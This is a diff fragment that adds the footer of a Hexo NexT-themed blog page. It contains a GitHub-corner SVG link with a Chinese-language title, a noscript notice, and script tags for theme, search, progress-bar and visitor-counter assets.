+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
